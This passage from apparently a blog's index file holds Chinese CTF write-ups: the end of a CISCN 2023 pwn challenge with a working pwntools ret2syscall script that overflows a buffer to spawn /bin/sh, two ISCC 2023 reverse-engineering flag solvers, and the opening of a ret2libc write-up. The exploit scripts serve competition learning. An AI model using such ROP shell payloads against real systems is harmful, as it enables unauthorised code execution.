punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 向 name_addr 处填入b'./flag\x00\x00' 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span>payload <span class="token operator">+=</span> ORWio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF21.png" alt="CISCN2023-烧烤摊儿21.png"></p><hr><h1 id="思路三-ret2syscall"><a href="#思路三-ret2syscall" class="headerlink" title="思路三 (ret2syscall)"></a>思路三 (ret2syscall)</h1><p>在思路一中买下摊位执行 <code>gaiming()</code> 函数后<br>由于程序没有给出 libc 文件，并且可以向 <code>name</code> 所在的 <code>.data</code> 段写入数据<br>因此可以考虑向 <code>.data</code> 段上写入 <code>&quot;/bin/sh&quot;</code></p><p>但程序中没有 <code>system()</code> 函数，可以考虑使用 ret2syscall 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 来 get shell</p><p>首先确定程序中存在 <code>pop rax ; ret</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF22.png" alt="CISCN2023-烧烤摊儿22.png"></p><p>还要存在 <code>syscall</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF23.png" alt="CISCN2023-烧烤摊儿23.png"></p><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;/bin/sh\x00&#39;</code>，并溢出 <code>v5</code> 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 执行</p><p>注意这里是将 <code>b&#39;/bin/sh\x00&#39;</code> 写入到 <code>name</code>，所以只能一次性 get shell</p><p>如果分两次的话，例如：第一次写入 <code>b&#39;/bin/sh\x00&#39;</code>，第二次执行 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，则在第二次中执行 <code>j_strcpy_ifunc(&amp;name, v5)</code> 又会将 <code>name</code> 覆盖掉，导致 get shell 失败</p><hr><h1 id="脚本三"><a href="#脚本三" class="headerlink" title="脚本三"></a>脚本三</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>pop_rax_addr <span class="token operator">=</span> <span class="token number">0x458827</span>syscall_addr <span class="token operator">=</span> <span class="token number">0x402404</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果三"><a href="#结果三" class="headerlink" title="结果三"></a>结果三</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF24.png" alt="CISCN2023-烧烤摊儿24.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> ORW </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】Convert</title>
      <link href="/posts/f43ef1b7.html"/>
      <url>/posts/f43ef1b7.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>逆向代码逻辑</p></li><li><p><mark>注意 IDA 伪代码中有一些数据的一部分会用其他变量来表示，记得拼接</mark></p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Convert</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Convert1.png" alt="ISCC2023-Convert1.png"></p><p>分析可知：<br><code>sub_4865AD(&amp;unk_5DC488, &amp;byte_5A04DC)</code> 为 <code>printf(&quot;请输入flag：\n&quot;)</code><br><code>sub_484D2F(&amp;dword_5DC3E0, v5)</code> 为 <code>scanf(&quot;%s&quot;, v5)</code><br>逻辑比较简单，就是将输入 <code>v5</code> 进行处理后与 <code>v8</code> 进行比较，如果相同则获得 flag</p><p>主要的处理逻辑在 <code>sub_488B0A(v5, v7, v6)</code> 中，<code>sub_488B0A(v5, v7, v6)</code> 会调用 <code>sub_499080(a1, a2, a3)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Convert2.png" alt="ISCC2023-Convert2.png">  </p><p>这里的逻辑也不复杂，直接将这个算法逆过来即可</p><p>注意伪代码中的 <code>v9</code>，其实也是密文的一部分<br>完整的密文内容为 <code>v8</code> 和 <code>v9</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10Ch] [ebp-30h] BYREF  </span>    <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+118h] [ebp-24h] BYREF  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'('</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'b'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">85</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'B'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'D'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'W'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'G'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\''</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token char">'5'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">':'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'s'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token string">"ISCC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">12</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span> <span class="token operator">*</span> j<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-=</span> j <span class="token operator">^</span> <span class="token operator">-</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v6 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> i<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>ISCC{1!&amp;&amp;?7!]&lt;MYI&amp;+*AE}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Convert3.png" alt="ISCC2023-Convert3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】Pull the Wool Over People&#39;s Eyes</title>
      <link href="/posts/9f2898f.html"/>
      <url>/posts/9f2898f.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>使用 OllyDBG 动态调试直接获取程序的中间数据</p></li><li><p>分析伪代码函数逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Pull the Wool Over People’s Eyes</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes1.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes1.png"></p><p>代码比较长，先定位到输入的位置：<br><code>sub_402190(std::cin, v35)</code> 让用户输入 <code>v35</code><br><code>sub_401650(Src, v22, v25)</code> 用于生成一个 <code>Src</code>，后面会用到</p><p>生成 <code>Src</code> 的逻辑如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes2.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes2.png"></p><p>虽然给出了生成 <code>Src</code> 的代码，但是这里可以通过 OllyDBG 动态调试直接得到 <code>Src</code> 的内容，在 <code>sub_401650()</code> 函数的返回值处，下一个断点即可</p><p>先找到 <code>return Src;</code> 这句的地址，在这一条指令处使用快捷键 <code>TAB</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes3.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes3.png"></p><p>在 OllyDBG 中打开，定位到该位置，在 IDA 中该地址为 <code>0x004017DB</code>，在 OllyDBG 中为 <code>0x000E17DB</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes4.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes4.png"></p><p><code>F2</code> 下断点<br>直接运行程序，输入的时候随便输入即可<br>在堆栈窗口中即可看到生成的 <code>Src</code> 的值为：<code>ISCC&#123;ACYeeeloorrsuv&#125;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes5.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes5.png"></p><p>跟踪 <code>Src</code> 和 <code>v35</code> 的处理过程，观察到如下代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes6.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes6.png"></p><p>首先将输入 <code>v35</code> 赋值给 <code>v4</code>，<code>Src</code> 赋值给 <code>v5</code><br>其中，<code>v3</code> 为 <code>v35</code> 和 <code>Src</code> 的索引，<code>v29</code> 为 <code>v6</code> 的索引<br><code>v7 = v4 + v3</code> 指向 <code>v35</code><br><code>v8 = v5 + v3</code> 指向 <code>Src</code><br><code>v6</code> 指向 <code>v35</code><br><code>*(v6 + v29) = *v8 ^ *v7</code> 将 <code>v35</code> 和 <code>Src</code> 进行异或，即 <code>v35[] = Src[] ^ v35[]</code></p><p>后面定义了一串 0 和 1 的字符串 <code>v10</code>，并用一个 while() 循环比较 <code>v9[]</code> 和 <code>v10[]</code> 的值是否相等<br>若每一位都相等，则 <code>v13 = 0</code>，输出 Right</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes7.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes7.png"></p><p>由初值 <code>v11 = 156</code>，<code>v14 = v11 &lt; 4</code>，当 <code>v11 &lt; 4</code> 时结束循环<br>结合 <code>Src = ISCC&#123;ACYeeeloorrsuv&#125;</code> 长度为 20<br><code>v10</code> 长度为 160，每 8 位二进制作为一组与 <code>Src</code> 进行异或<br>即可得到 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"ISCC&#123;ACYeeeloorrsuv&#125;"</span>  v10 <span class="token operator">=</span> <span class="token string">"0000000000000000000000000000000000000000011001000111001000101110001001110001010100000001000111110101110100101100000111010100101100100100010000010010000000000000"</span>  num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          t <span class="token operator">+=</span> v10<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span>      num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>ISCC</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】Login</title>
      <link href="/posts/234b42d1.html"/>
      <url>/posts/234b42d1.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>经典的 ret2libc 问题，<mark>需要结合动态调试来确定程序泄露的具体函数名</mark></p></li><li><p><mark>需注意实际的字节数，不要下意识就 64 位程序用 <code>p64()</code>，32 位程序用 <code>p32()</code></mark></p></li><li><p>结合动态调试，有时候需要注意 <code>io.send()</code> 和 <code>io.sendline()</code></p></li><li><p><mark>注意 libc 版本问题，libc 版本不一致计算偏移也会不一样</mark></p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Login</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目给出了 libc 文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login2.png" alt="ISCC2023-Login2.png"></p><p>分析文件并运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login1.png" alt="ISCC2023-Login1.png"></p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login3.png" alt="ISCC2023-Login3.png"></p><p>逻辑比较简单，首先程序会在运行中给出 <code>stdin</code> 的真实地址</p><p>需要满足 <code>v6 = 365696460</code> 才能继续往下，观察一下 v6 在栈中的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login4.png" alt="ISCC2023-Login4.png"></p><p>由于 buf 输入的长度为 0x20，无法覆盖返回地址，但是可以覆盖 v6 的值，因此可以修改 v6 为 365696460 （0x15CC15CC）</p><blockquote><p>注意：<br><em>这里 v6 为 4 字节</em>，需要 buf 先填充 <code>0x20 - 0x4</code> 个垃圾字符到达<br>修改 v6 的值应该为：<code>p32(365696460)</code>、<code>p32(0x15CC15CC)</code> 或 <code>b&#39;\xCC\x15\xCC\x15&#39;</code>，<strong>不要因为是 64 位程序就下意识写成 <code>p64(365696460)</code></strong></p></blockquote><p>绕过 if 判断后，<code>read()</code> 函数又可以输入 0x100，但是在栈中 v4 位于 <code>rbp - 120h</code> 处，因此同样无法覆盖返回地址</p><p>进入到 <code>print_name()</code> 函数中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login5.png" alt="ISCC2023-Login5.png"></p><p>这里使用 <code>memcpy()</code> 将 v4 复制到 dest 中，由于 dest 长度只有 32，位于 <code>rbp - 20h</code> 处，因此可以通过 v4 来赋值 dest 覆盖到返回地址</p><p>不过程序中既没有 <code>&quot;/bin/sh&quot;</code> 也没有后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login6.png" alt="ISCC2023-Login6.png"></p><p>由于给出了 libc 文件，因此考虑使用 ret2libc</p><p>需要注意这里给出的 <code>stdin</code> 的地址，跟进一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login7.png" alt="ISCC2023-Login7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login8.png" alt="ISCC2023-Login8.png"></p><p><mark>在编写脚本时发现在 libc 中寻找 <code>stdin</code> 的地址来计算偏移是不对的，动态调试一下看看</mark></p><p>单步执行到 <code>printf(&quot;Here is a tip: %p\n&quot;, stdin)</code> 这一句：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login9.png" alt="ISCC2023-Login9.png"></p><p>发现传给 <code>printf()</code> 的参数是 <code>_IO_2_1_stdin_</code> 而不是 <code>stdin</code>，因此应该在 libc 中寻找 <code>_IO_2_1_stdin_</code> 的地址来计算偏移</p><p>获取 gadget 地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login10.png" 